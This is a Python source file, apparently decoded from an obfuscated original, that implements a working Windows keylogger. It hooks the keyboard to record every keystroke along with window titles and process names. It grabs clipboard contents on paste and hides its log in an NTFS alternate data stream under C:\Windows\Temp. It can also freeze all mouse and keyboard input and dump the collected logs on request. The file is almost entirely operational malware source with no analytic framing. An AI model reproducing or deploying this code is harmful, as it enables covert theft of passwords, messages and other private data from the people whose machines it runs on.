#!/usr/bin/env python3
# Decoded from Configuration/st_win_keylogger.py
# Original was obfuscated with exec(SEC(INFO(...)))


import os
import sys
import time
import ctypes
import pyHook
import datetime
import pythoncom
import threading
import subprocess
# TODO: Replace wildcard import with specific imports
# TODO: Replace wildcard import with specific imports
from ctypes import *
import win32clipboard

class keylogger():

    def __init__(self):
        self.kl_status = False
        self.frz_status = False
        self.active_window = ''
        self.log_file = 'C:\Windows\Temp:stkl.log'

    def start(self):
        kl_summary = ''
        self.kl_status= True
        now = datetime.datetime.now()
        start_time=now.strftime("%Y-%m-%d %H:%M:%S")
        kl_summary = "\n[ {} ] - Keylogger is now running".format(start_time)
        self.log_handle = open(self.log_file,'a')
        self.log_handle.write(kl_summary)
        self.thread = threading.Thread(target=self.run)
        self.thread.start()

    def start_freeze(self):
        self.frz_status = True
        self.thread = threading.Thread(target=self.run_freeze)
        self.thread.start()

    def win_get_clipboard(self):
        try:
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            return pasted_value
        except Exception:
            return

    def get_active_win(self):
        kl_summary = ''
        hwnd = self.user32.GetForegroundWindow()
        pid = c_ulong(0)
        self.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        process_id = "{}".format(pid.value)
        executable = create_string_buffer("\x00" * 512)
        h_process = self.kernel32.OpenProcess(0x400 | 0x10, False, pid)
        self.psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
        window_title = create_string_buffer("\x00" * 512)
        length = self.user32.GetWindowTextA(hwnd, byref(window_title),512)
        now = datetime.datetime.now()
        proc_time=now.strftime("%Y-%m-%d %H:%M:%S")
        proc_info = "[ %s ][ PID: %s - %s - %s ]" % (proc_time, process_id, executable.value, window_title.value)
        kl_summary = "\n\n"
        kl_summary += proc_info
        kl_summary += "\n"
        if self.kl_status:
            self.log_handle.write(kl_summary)

        # close handles
        self.kernel32.CloseHandle(hwnd)
        self.kernel32.CloseHandle(h_process)

    def KeyStroke(self,event):
        kl_summary = ''
        if self.kl_status:
            if event.WindowName != self.active_window:
                self.active_window = event.WindowName
                self.get_active_win()
                self.key_count = 0
            if self.key_count > 75:
                kl_summary += "\n"
                self.key_count = 0
            if event.Ascii > 32 and event.Ascii < 127:
                kl_summary += chr(event.Ascii)
                self.key_count += 1
            else:
                if event.Key == "V":
                    try:
                        pasted_value = self.win_get_clipboard()
                        kl_summary += "[PASTE] - {}".format(pasted_value)
                        self.key_count += 10+len(pasted_value)
                        self.last_pasted_value = pasted_value
                    except Exception as e:
                        if 'access is denied' in str(e).lower():
                            kl_summary += "[PASTE] - {}".format(self.last_pasted_value)
                            self.key_count += 10+len(last_pasted_value)
                else:
                    kl_summary += "[{}]".format(event.Key)
                    self.key_count += 2+len(event.Key)
            self.log_handle.write(kl_summary)
        return True

    def run(self):
        kl_summary = ''
        self.kl_status= True
        self.key_count = 0
        self.kl = pyHook.HookManager()
        self.psapi = ctypes.windll.psapi
        self.user32 = ctypes.windll.user32
        self.kernel32 = ctypes.windll.kernel32
        self.pasted_value = self.win_get_clipboard()

        while self.kl_status:
            self.kl.KeyDown = self.KeyStroke
            self.kl.HookKeyboard()
            while self.kl_status:
                pythoncom.PumpWaitingMessages()
            self.kl.__del__()
        now = datetime.datetime.now()
        end_time=now.strftime("%Y-%m-%d %H:%M:%S")
        kl_summary = "\n\n[ {} ] - Keylogger has been stopped\n".format(end_time)
        self.log_handle.write(kl_summary)
        self.log_handle.close()

    def keyFreeze(self,event):
        return False

    def keyUnfreeze(self,event):
        return True

    def run_freeze(self):
        while self.frz_status:
            freezer = pyHook.HookManager()
            freezer.MouseAll = self.keyFreeze
            freezer.KeyAll = self.keyFreeze
            freezer.HookMouse()
            freezer.HookKeyboard()
            while self.frz_status:
                pythoncom.PumpWaitingMessages()
            freezer.MouseAll = self.keyUnfreeze
            freezer.KeyAll = self.keyUnfreeze
            freezer.HookMouse()
            freezer.HookKeyboard()
            freezer.__del__()

    def stop(self):
        self.kl_status = False

    def stop_freeze(self):
        self.frz_status = False

    def get_status(self):
        return self.kl_status

    def get_frz_status(self):
        return self.frz_status

    def dump_logs(self):
        with open(self.log_file,'rb') as s:
            resp = ''
            data = s.readlines()
            for line in data:
                resp += line
        return resp

    def get_dump(self):
        if self.get_status():
            self.kl_status = False
            self.log_handle.close()
            resp=self.dump_logs()
            self.log_handle = open(self.log_file,'w')
            self.kl_status = True
            self.active_window = ''
            self.key_count = 0
        else:
            resp=self.dump_logs()
        return str(resp)

def start_st_kl():
    try:
        st_kl = keylogger()
        st_kl.start()
        return True
    except Exception as e:
        return "ERROR: {}".format(e)
